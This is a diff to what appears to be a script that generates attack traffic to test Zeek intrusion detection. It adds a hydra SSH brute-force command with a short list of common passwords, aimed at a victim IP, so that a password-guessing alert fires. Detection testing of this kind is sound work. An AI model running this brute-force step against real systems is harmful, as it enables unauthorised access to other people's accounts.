@@ -110,7 +110,15 @@ curl -s "http://testmyids.com/" || true
 # ---------- SSH Brute Force ----------
 
 echo "[10/13] SSH brute force attempts (hydra)"
-hydra -l admin -P /dev/null -t 4 -w 5 -f "ssh://${VICTIM_IP}" 2>/dev/null || true
+# Feed hydra a real (small) password list so it generates >=15 ssh_auth_failed
+# events, which is the threshold Zeek's protocols/ssh/detect-bruteforcing uses
+# to raise SSH::Password_Guessing. -P /dev/null is a no-op.
+PWLIST=$(mktemp)
+printf '%s\n' password 123456 admin root toor letmein qwerty welcome \
+  admin123 changeme passw0rd monkey dragon master sunshine princess \
+  football abc123 iloveyou trustno1 baseball >"$PWLIST"
+hydra -l admin -P "$PWLIST" -t 4 -w 5 -f "ssh://${VICTIM_IP}" 2>/dev/null || true
+rm -f "$PWLIST"
 # Generate failed SSH login attempts
 for user in root admin test oracle postgres mysql; do
   ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=2 \
